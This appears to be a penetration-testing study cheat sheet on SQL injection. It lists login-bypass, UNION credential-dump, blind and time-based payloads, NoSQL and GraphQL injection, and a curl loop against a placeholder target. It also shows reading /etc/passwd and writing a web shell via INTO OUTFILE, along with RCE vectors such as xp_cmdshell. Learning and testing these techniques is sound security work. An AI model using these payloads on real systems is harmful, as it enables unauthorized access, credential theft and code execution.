## 🧬 SQL Injection (SQLi)

**Tags:** `#SQLi` `#SQLInjection` `#injection` `#HTB` `#OffSec`

---

## 📚 References

* 🔗 [ISO/IEC 9075 - Wikipedia](https://en.wikipedia.org/wiki/ISO/IEC_9075)
* 🔗 [MySQL :: 8.0 Reference Manual - SHOW GRANTS](https://dev.mysql.com/doc/refman/8.0/en/show-grants.html)
* 🧰 [PayloadAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
* 🧪 [sqlmap](https://sqlmap.org/)
* 🔗 [SecLists - SQLi Payloads](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi)
* 🔗 [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
* 🔗 [HackTricks - SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)

---

## 🧠 Concepts

* SQLi allows attackers to manipulate backend SQL queries by injecting malicious input.
* Exploitable when user input is not sanitized and used directly in SQL statements.
* Categories:

  * ✅ **In-band**: Error-based, Union-based
  * 🧱 **Inferential/Blind**: Boolean, Time-based
  * 🌐 **Out-of-band**: DNS/HTTP callbacks

---

## 📦 SQLi + Attack Chains

| Chain                                   | Description                        | Tools Used              |
| --------------------------------------- | ---------------------------------- | ----------------------- |
| `SQLi → Credential Dump → Admin Panel`  | Dump creds and reuse in admin area | `sqlmap`, `Burp`        |
| `SQLi → File Write → Web Shell`         | Write shell via `INTO OUTFILE`     | `sqlmap`, `Burp`        |
| `SQLi → RCE (MSSQL)`                    | Use `xp_cmdshell` to gain RCE      | `sqlmap`, `ncat`        |
| `SQLi → DB Dump → Offline Cracking`     | Exfiltrate hashes → crack offline  | `hashcat`, `john`       |
| `SQLi → Local File Read → Configs/Keys` | Use `LOAD_FILE()` to read secrets  | `sqlmap`, manual        |
| `SQLi → Lateral Movement`               | Dump creds → SSH/RDP reuse         | `crackmapexec`, `hydra` |

---

## 📌 Indicators of SQLi

* SQL errors in response
* Login bypass (`' OR 1=1--`)
* `1=1` vs `1=2` response diff
* Delayed responses (timing)
* Reflected query data
* Application crash/log events

---

## 🔍 How to Test

### 🔹 Manual Injection

* `' OR '1'='1--`
* `admin' --`
* `admin' #`

### 🔹 Boolean Checks

* `' AND 1=1--`
* `' AND 1=2--`

### 🔹 Time-Based Checks

* `' OR SLEEP(5)--`
* `' OR pg_sleep(5)--`

### 🔹 Union Probing

* `' UNION SELECT NULL--`
* `' ORDER BY 3--`
* `' UNION SELECT 1,2,3--`

---

## ⚙️ SQLi Tool Comparison

| Tool       | Auto Enum | File R/W | OS Support | Timing | Proxy | Notes                 |
| ---------- | --------- | -------- | ---------- | ------ | ----- | --------------------- |
| `sqlmap`   | ✅         | ✅        | ✅          | ✅      | ✅     | Gold standard         |
| `NoSQLMap` | ✅         | ❌        | MongoDB    | ✅      | ✅     | NoSQL injection       |
| `Burp`     | Manual    | ❌        | ✅          | ✅      | ✅     | Repeater, Scanner     |
| `Havij`    | ✅         | ✅        | ❌          | ❌      | ❌     | Deprecated            |
| `jSQLi`    | ✅         | ✅        | ✅          | ✅      | ✅     | Java GUI              |
| `bbqsql`   | ✅         | ❌        | ✅          | ✅      | ✅     | Blind SQLi automation |

---

## 📥 Data Exfiltration Payloads

```sql
' UNION SELECT user, password FROM users-- -
' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'-- -
```

---

## 🧰 Payload Repository References

* 📦 [PayloadAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
* 📦 [SecLists - SQLi Payloads](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi)
* 🛠️ [SQLi Cheat Sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* 🔗 [HackTricks SQLi Guide](https://book.hacktricks.xyz/pentesting-web/sql-injection)

---

## 🧬 Modern SQLi Variants

### 🔹 NoSQL Injection

* MongoDB query injection:

  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  ```
* Login bypass:

  ```json
  { "user": { "$gt": "" }, "pass": { "$gt": "" } }
  ```

### 🔹 GraphQL Injection

* Malformed queries:

  ```graphql
  query {
    user(id: "1) { id name }")
  }
  ```

* Injection through resolver args:

  ```graphql
  query {
    search(query: "\")) { id name } #")
  }
  ```

---

## 🔁 Payload Rotation Scripts

Bash (for `curl` testing):

```bash
for payload in "' OR 1=1--" "' AND 1=2--" "' UNION SELECT 1,2--" "' OR SLEEP(5)--"
do
  echo "[*] Testing: $payload"
  curl -s -G "http://target.com/login" --data-urlencode "user=$payload" --data "pass=test"
done
```

Burp Intruder Payload List:

```text
' OR 1=1--
' UNION SELECT NULL--
' AND 1=1--
' OR SLEEP(5)--
admin' #
```

---

## 🧪 SQLi Response Fingerprints

| Payload                | Expected Behavior  | Response Indicator |
| ---------------------- | ------------------ | ------------------ |
| `' OR 1=1--`           | Auth bypass        | Logged in          |
| `' AND 1=2--`          | False test         | Access denied      |
| `' OR SLEEP(5)--`      | Time delay         | +5s delay          |
| `' UNION SELECT 1,2--` | Union test         | Additional content |
| `ORDER BY 10--`        | Column count error | SQL syntax error   |
| `'`                    | Basic probe        | Quoting error      |

---

## 🧮 Column Count Discovery

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

Last successful number = total visible columns.

---

## 🧾 Blind SQLi Examples

**Boolean:**

```sql
' AND 1=1--       -- True
' AND 1=2--       -- False
```

**Time-Based:**

```sql
' OR IF(1=1, SLEEP(5), 0)-- -
' AND pg_sleep(5)-- -
```

---

## 🔒 File Access & Shells

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT 'php code' INTO OUTFILE '/var/www/html/shell.php';
```

---

## 🧰 Tooling Tips

* **sqlmap**: Full automation, proxy support
* **Burp Suite**: Manual/Scanner
* **ffuf/wfuzz**: Fuzz params with payloads
* **sqlitebrowser**: For dumped .db files
* **NoSQLMap**: NoSQL injection testing

---

## 📋 SQLi Testing Checklist

* [ ] Injection string testing
* [ ] Boolean logic difference
* [ ] Time-based delay
* [ ] UNION column discovery
* [ ] Table and column enumeration
* [ ] Exfiltrate data
* [ ] Check file write/load functions
* [ ] Check for RCE functions
* [ ] WAF evasion (encoding, case, comments)
* [ ] Use `sqlmap` and confirm manually

---

## 📋 SQLi Testing Checklist

### ✅ SQLi Testing Checklist (General)

* [ ] Test for basic injection with `' OR '1'='1` and `'--`
* [ ] Check for error messages (e.g., SQL syntax hints)
* [ ] Use `ORDER BY` to find number of columns
* [ ] Test `UNION SELECT` for data extraction
* [ ] Boolean-based blind SQLi (`AND 1=1`, `AND 1=2`)
* [ ] Time-based blind SQLi (`SLEEP()`, `IF()` / `CASE WHEN`)
* [ ] Error-based SQLi for data leakage via messages
* [ ] Bypass techniques: inline comments, URL encoding, casing
* [ ] Enumerate database info (`@@version`, `user()`, etc.)
* [ ] Explore `information_schema` for tables/columns
* [ ] Check for file access (`LOAD_FILE`, `INTO OUTFILE`, etc.)
* [ ] Look for RCE vectors (e.g., `xp_cmdshell`, `COPY FROM PROGRAM`)
* [ ] Automate with `sqlmap`, test manually via Burp or CLI
* [ ] Document all payloads, responses, and findings

---

### 🐬 MySQL-Specific

* [ ] Use `user()`, `database()`, `@@version`
* [ ] Enumerate with `information_schema.schemata`
* [ ] Attempt file read: `SELECT LOAD_FILE('/etc/passwd')`
* [ ] Attempt file write: `INTO OUTFILE '/var/www/html/shell.php'`
* [ ] Check `@@secure_file_priv` for write locations
* [ ] Check privileges with `SHOW GRANTS` and `mysql.user`
* [ ] Use `BENCHMARK()` as a timing alternative to `SLEEP()`

---

### 🐘 PostgreSQL-Specific

* [ ] Use `current_user`, `version()`, `current_database()`
* [ ] Extract schema from `information_schema.tables`
* [ ] Use `pg_sleep(seconds)` for time-based SQLi
* [ ] Attempt file read/write via `COPY ... TO/FROM`
* [ ] Test `COPY ... FROM PROGRAM 'cmd'` for RCE (if enabled)
* [ ] Use `pg_roles`, `pg_user` to check permissions

---

### 🪟 MSSQL-Specific

* [ ] Use `SYSTEM_USER`, `@@VERSION`, `DB_NAME()`
* [ ] Try error-based payloads using `CONVERT()` or `CAST()`
* [ ] Time delay with `WAITFOR DELAY '0:0:5'`
* [ ] Attempt command execution with `xp_cmdshell`
* [ ] Enumerate schema via `INFORMATION_SCHEMA`
* [ ] Use `IS_SRVROLEMEMBER` to check role memberships
* [ ] Look for linked servers via `sp_linkedservers`

---

### 🏛️ Oracle-Specific
* [ ] Retrieve DB info with `SELECT banner FROM v$version`
* [ ] Get current user: `SELECT USER FROM dual`
* [ ] Get current database: `SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual`
* [ ] Time delay using `DBMS_LOCK.SLEEP(seconds)`
* [ ] Extract table/column info from `ALL_TABLES`, `ALL_TAB_COLUMNS`, or `USER_TABLES`
* [ ] Test for error-based SQLi with `TO_NUMBER()` or malformed queries
* [ ] Look for file access via `UTL_FILE` (requires directory object and privileges)
* [ ] Attempt network access with `UTL_HTTP`, `UTL_INADDR` (for OOB data exfil)
* [ ] Check roles and privileges with `SELECT * FROM SESSION_ROLES` and `USER_SYS_PRIVS`
* [ ] Identify RCE or job scheduling opportunities via `DBMS_SCHEDULER`, `DBMS_JOBS`
* [ ] Check for enabled Java stored procedures (e.g., `loadjava`, `java.io.*`)

---

## 🔄 Realistic SQLi Exploitation Flow

- **Discover**: `' OR 1=1--` → login bypass
- **Identify Column Count**: `' ORDER BY 3--`
- **Confirm UNION Injection**: `' UNION SELECT NULL,NULL--`
- **Dump Credentials**: `' UNION SELECT user, password FROM users--`

---

## 🧬 DBMS-Specific Notes

| DBMS           | Info Function  | Version            | User           | DB                   |
| -------------- | -------------- | ------------------ | -------------- | -------------------- |
| **MySQL**      | `user()`       | `@@version`        | `user()`       | `database()`         |
| **PostgreSQL** | `current_user` | `version()`        | `current_user` | `current_database()` |
| **MSSQL**      | `SYSTEM_USER`  | `@@VERSION`        | `SYSTEM_USER`  | `DB_NAME()`          |
| **Oracle**     | `USER`         | `v$version`        | `USER`         | `SYS_CONTEXT(...)`   |
| **SQLite**     | N/A            | `sqlite_version()` | N/A            | N/A                  |

---
